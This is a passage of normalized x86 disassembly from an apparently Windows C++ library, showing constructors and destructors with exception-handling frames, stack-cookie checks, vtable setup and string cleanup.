mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x78 ]
mov [ esi + 0x74 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x78 ] r--data
mov [ esi + 0x6c ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_100203c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004faca
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x18 ] 0x0
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x40 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x48 ]
mov [ ecx + esi - 0x4 ] eax
lea ecx [ esi + 0x4 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x6
lea edi [ esi + 0x1c ]
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] eax
mov [ edi ] ax
mov [ ebp - 0x4 ] 0x7
lea eax [ ebp + 0x1c ]
cmp ecx eax
je r-xdata
mov [ esi ] r--data
mov [ esi + 0x4c ] r--data
mov [ esi + 0x50 ] r--data
mov [ esi + 0x40 ] r--data
mov [ ebp - 0x4 ] 0x2
lea ecx [ esi + 0x48 ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x4
push ecx
push 0x11
push [ ebp + 0xc ]
lea ecx [ esi + 0x50 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x10 ] 0x7
lea eax [ ebp + 0x34 ]
cmp edi eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
mov eax [ ebp + 0x10 ]
mov [ esi + 0x34 ] eax
mov eax [ ebp + 0x14 ]
mov [ esi + 0x38 ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x30 ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx edi
call sub_10003a20
xor eax eax
mov [ ebp + 0x30 ] 0x7
mov [ ebp + 0x2c ] 0x0
mov [ ebp + 0x1c ] ax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x48 ] 0x8
jb r-xdata
push [ ebp + 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp + 0x48 ] 0x7
mov [ ebp + 0x34 ] ax
mov eax esi
mov [ ebp + 0x44 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x44
push [ ebp + 0x34 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10020570
push ebp
mov ebp esp
push 0xffffffff
push sub_1004fb06
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x40 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x40 ] r--data
mov eax [ esi - 0x40 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x40 ] r--data
mov eax [ esi - 0x40 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x40 ]
mov [ ecx + esi - 0x44 ] eax
mov eax [ esi - 0x40 ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x48 ]
mov [ ecx + esi - 0x44 ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ esi - 0x10 ] 0x8
jb r-xdata
mov [ esi - 0x10 ] 0x7
xor eax eax
mov [ esi - 0x14 ] 0x0
mov [ esi - 0x24 ] ax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0x28 ] 0x8
jb r-xdata
push [ esi - 0x24 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ esi - 0x28 ] 0x7
mov [ esi - 0x2c ] 0x0
mov [ esi - 0x3c ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x3c ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10020640
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x40 ]
mov ecx esi
call sub_10020670
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10020670
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f25b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea ecx [ esi + 0x40 ]
call sub_10020570
mov eax [ esi + 0x50 ]
lea edx [ esi + 0x6c ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x4c ]
mov [ esi + 0x48 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x4c ] r--data
mov [ esi + 0x40 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10020730
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f174
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x14 ] r--data
mov [ esi + 0x18 ] r--data
mov [ esi + 0x8 ] r--data
mov [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x10 ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x2
push ecx
push 0x19
push [ ebp + 0xc ]
lea ecx [ esi + 0x18 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x3
mov eax [ esi ]
mov [ ebp - 0x10 ] 0x7
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x10 ]
mov [ ecx + esi - 0x4 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_10020820
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x8 ]
mov ecx esi
call sub_10020850
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10020850
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f0fb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi ]
lea edx [ esi + 0x34 ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + esi ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ eax + esi ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x10 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x14 ]
mov [ esi + 0x10 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x14 ] r--data
mov [ esi + 0x8 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10020930
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f174
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x14 ] r--data
mov [ esi + 0x18 ] r--data
mov [ esi + 0x8 ] r--data
mov [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x10 ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x2
push ecx
push 0x18
push [ ebp + 0xc ]
lea ecx [ esi + 0x18 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x3
mov eax [ esi ]
mov [ ebp - 0x10 ] 0x7
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x10 ]
mov [ ecx + esi - 0x4 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_10020a20
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x8 ]
mov ecx esi
call sub_10020a50
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10020a50
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f0fb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi ]
lea edx [ esi + 0x34 ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + esi ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ eax + esi ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x8 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x10 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x14 ]
mov [ esi + 0x10 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x14 ] r--data
mov [ esi + 0x8 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10020b30
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f667
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x2c ]
mov [ ecx + esi - 0x4 ] eax
lea ecx [ esi + 0x4 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x5
mov al [ ebp + 0x10 ]
mov [ esi + 0x1c ] al
lea eax [ ebp + 0x18 ]
cmp ecx eax
je r-xdata
mov [ esi ] r--data
mov [ esi + 0x30 ] r--data
mov [ esi + 0x38 ] r--data
mov [ esi + 0x24 ] r--data
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0x2c ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x3
push ecx
push 0x16
push [ ebp + 0xc ]
lea ecx [ esi + 0x38 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x10 ] 0x7
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x2c ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
xor eax eax
mov [ ebp + 0x2c ] 0x7
mov [ ebp + 0x18 ] ax
mov eax esi
mov [ ebp + 0x28 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x28
push [ ebp + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10020c80
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f69b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x24 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x24 ] r--data
mov eax [ esi - 0x24 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x24 ] r--data
mov eax [ esi - 0x24 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + esi - 0x28 ] eax
mov eax [ esi - 0x24 ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x2c ]
mov [ ecx + esi - 0x28 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0xc ] 0x8
jb r-xdata
xor eax eax
mov [ esi - 0xc ] 0x7
mov [ esi - 0x10 ] 0x0
mov [ esi - 0x20 ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10020d20
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x24 ]
mov ecx esi
call sub_10020d50
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10020d50
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f25b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea ecx [ esi + 0x24 ]
call sub_10020c80
mov eax [ esi + 0x38 ]
lea edx [ esi + 0x54 ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x30 ]
mov [ esi + 0x2c ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x30 ] r--data
mov [ esi + 0x24 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10020e10
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f667
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x2c ]
mov [ ecx + esi - 0x4 ] eax
lea ecx [ esi + 0x4 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x5
mov al [ ebp + 0x10 ]
mov [ esi + 0x1c ] al
lea eax [ ebp + 0x18 ]
cmp ecx eax
je r-xdata
mov [ esi ] r--data
mov [ esi + 0x30 ] r--data
mov [ esi + 0x38 ] r--data
mov [ esi + 0x24 ] r--data
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0x2c ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x3
push ecx
push 0x17
push [ ebp + 0xc ]
lea ecx [ esi + 0x38 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x10 ] 0x7
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x2c ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
xor eax eax
mov [ ebp + 0x2c ] 0x7
mov [ ebp + 0x18 ] ax
mov eax esi
mov [ ebp + 0x28 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x28
push [ ebp + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10020f60
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f69b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x24 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x24 ] r--data
mov eax [ esi - 0x24 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x24 ] r--data
mov eax [ esi - 0x24 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + esi - 0x28 ] eax
mov eax [ esi - 0x24 ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x2c ]
mov [ ecx + esi - 0x28 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0xc ] 0x8
jb r-xdata
xor eax eax
mov [ esi - 0xc ] 0x7
mov [ esi - 0x10 ] 0x0
mov [ esi - 0x20 ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10021000
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x24 ]
mov ecx esi
call sub_10021030
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10021030
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f25b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea ecx [ esi + 0x24 ]
call sub_10020f60
mov eax [ esi + 0x38 ]
lea edx [ esi + 0x54 ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x30 ]
mov [ esi + 0x2c ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x30 ] r--data
mov [ esi + 0x24 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_100210f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004fb3b
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x30
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor ecx ecx
push ecx
push [ ebp + 0xc ]
mov ecx eax
push [ ebp + 0x8 ]
call sub_1001cbc0
mov ecx eax
jmp r-xdata
mov eax [ ecx ]
mov eax [ eax + 0x8 ]
add eax ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
mov [ ebp - 0x4 ] 0xffffffff
test ecx ecx
jne r-xdata
sub_10021180
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fb83
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x24 ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x38 ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x10 ]
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x40 ] 0x0
lea edx [ esp + 0x18 ]
mov eax [ ecx ]
push edx
call [ eax + 0x18 ]
test eax eax
jne r-xdata
push 0x48
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x14 ] edi
mov [ esp + 0x40 ] 0x1
test edi edi
je r-xdata
xor esi esi
jmp r-xdata
xor ecx ecx
sub esp 0x18
lea eax [ esp + 0x30 ]
mov esi esp
mov [ esp + 0x24 ] esp
sub esp 0x18
mov ecx esp
mov [ esp + 0x40 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0x70 ] 0x2
mov [ esp + 0x70 ] 0x1
mov ecx esi
call sub_1003c240
add esp 0x18
mov [ esp + 0x58 ] 0x3
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov [ esp + 0x64 ] 0x1
mov ecx edi
call sub_1001cdc0
mov ecx eax
jmp r-xdata
mov [ esp + 0x40 ] 0xffffffff
cmp [ esp + 0x2c ] 0x10
jb r-xdata
mov eax [ ecx ]
mov esi [ eax + 0x8 ]
add esi ecx
xor esi esi
jmp r-xdata
mov [ esp + 0x40 ] 0x0
test ecx ecx
jne r-xdata
mov [ esp + 0x2c ] 0xf
mov eax esi
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] 0x0
mov ecx [ esp + 0x38 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x24 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
push [ esp + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100212e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004fb3b
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x30
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor ecx ecx
push ecx
push [ ebp + 0xc ]
mov ecx eax
